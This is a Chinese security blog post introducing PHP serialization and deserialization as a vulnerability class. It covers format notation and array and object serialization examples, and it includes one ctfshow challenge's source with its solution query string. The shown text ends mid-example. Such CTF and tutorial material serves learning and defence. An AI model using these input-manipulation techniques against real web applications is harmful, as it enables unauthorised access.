
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>浅析反序列化 - hybcx's blog</title>

  
    <meta name="description" content="PHP反序列化 0x01 简介 什么是序列化？ 对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 什么是反序列化？ 字符串转换成对象 php序列化和反序列化的函数： 序列化：serialize() 反序列化：unserialize() tip：对字符串进行序列化后是它本身**（ctfshow web260）** 源码： &lt;?php  err">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析反序列化">
<meta property="og:url" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="PHP反序列化 0x01 简介 什么是序列化？ 对象转换成字符串 为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等 什么是反序列化？ 字符串转换成对象 php序列化和反序列化的函数： 序列化：serialize() 反序列化：unserialize() tip：对字符串进行序列化后是它本身**（ctfshow web260）** 源码： &lt;?php  err">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623204959799.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623205119665.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623205817354.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623205935983.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623210757827.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623210822480.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623210839958.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623210956081.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623211359257.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230311145523517.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230311145625392.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230311150147558.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230727165639082.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624192846524.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624193738145.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624194213912.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625144624240.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625151313599.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625152050380.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625154719893.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625154746462.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625160526050.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625160610328.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625162643118.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625191721351.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625202537692.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625202107801.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625203738853.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625205744849.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625205821179.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210110744.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210142667.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210153955.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210207128.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210327846.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210420068.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210529814.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625210845976.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625211226501.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625212501056.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625212559026.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625213132588.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625213302949.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625213625905.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625213847803.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625220645325.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230625220942835.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626152616582.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626152907795.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626165826427.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626172929666.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230727170910134.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624171722589.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624171836907.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624171935674.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624172000090.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624172153661.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230624172259036.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626175143920.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626180100412.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626180229200.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626180345266.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626182515714.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626182740031.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626182845552.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626183308867.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626183628792.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184058849.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184235633.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184320730.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184641153.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184700223.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230626184723948.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230629193140701.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230629193250527.png">
<meta property="og:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230629193319332.png">
<meta property="article:published_time" content="2023-07-27T08:46:43.037Z">
<meta property="article:modified_time" content="2024-04-15T11:49:21.305Z">
<meta property="article:author" content="hybcx">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://hybcx.xyz/2023/07/27/qian-xi-fan-xu-lie-hua/image-20230623204959799.png">
  
  
  
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/03/24/shell-xue-xi/"><span class="title">shell学习</span></a><a class="item title" href="/2023/08/06/qian-xi-ssti-lou-dong/"><span class="title">浅析SSTI漏洞</span></a><a class="item title" href="/2023/11/12/flask-pin-ma-xue-xi/"><span class="title">Flask-PIN码学习</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/">常见top漏洞</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-07-27T08:46:43.037Z">2023-07-27</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-04-15T11:49:21.305Z">2024-04-15</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>浅析反序列化</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="php反序列化">PHP反序列化</h1>
<h2 id="0x01-简介">0x01 简介</h2>
<p>什么是序列化？<br>
<strong>对象转换成字符串</strong><br>
为什么转换：1.持久保存。2.方便网络传输，例如session缓存，cookie等</p>
<p>什么是反序列化？<br>
<strong>字符串转换成对象</strong></p>
<p>php序列化和反序列化的函数：</p>
<p>序列化：serialize()</p>
<p>反序列化：unserialize()</p>
<p>tip：对字符串进行序列化后是它本身**（ctfshow web260）**</p>
<p>源码：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);

<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ctfshow_i_love_36D/'</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfshow'</span>]))){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}
<span class="hljs-comment">//因此直接?ctfshow=/ctfshow_i_love_36D/   即可</span></code></pre>
<h2 id="0x02-为何要-php-的序列化和反序列化">0X02 为何要 PHP 的序列化和反序列化</h2>
<p>看到这里，肯定会有人问这个问题，如果说 json 是为了传递数据的方便性，那么 PHP 的序列化又是为了什么呢？</p>
<p>当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦，是不是很方便？</p>
<h2 id="0x03-常见的序列化格式">0x03 常见的序列化格式</h2>
<ul>
<li>二进制格式</li>
<li>字节数组</li>
<li>json字符串</li>
<li>xml字符串</li>
</ul>
<h2 id="0x04-案例">0x04 案例</h2>
<p>数组序列化</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
  <span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">'hello'</span>,<span class="hljs-string">'hi'</span>);
  <span class="hljs-variable">$a_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_ser</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>结果：</p>
<pre><code class="hljs plaintext">a:2:{i:0;s:5:"hello";i:1;s:2:"hi";}</code></pre>
<pre><code class="hljs plaintext">2：表示a有两个属性
i：表示int型数据；0：表示下标0
s：表示string字符串数组；5：长度为5</code></pre>
<p>解析：</p>
<pre><code class="hljs plaintext">a - array      b - boolean
d - double     i - integer
o - common     object r - reference
s - string     C - custom object
O - class      N - null
R - pointer    reference U - unicode string</code></pre>
<p>对象序列化</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">'abab'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-number">18</span>;
        }
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pr</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name;
            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;age;
        }
        }
    <span class="hljs-variable">$stu</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();
    <span class="hljs-variable">$stu_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$stu</span>);
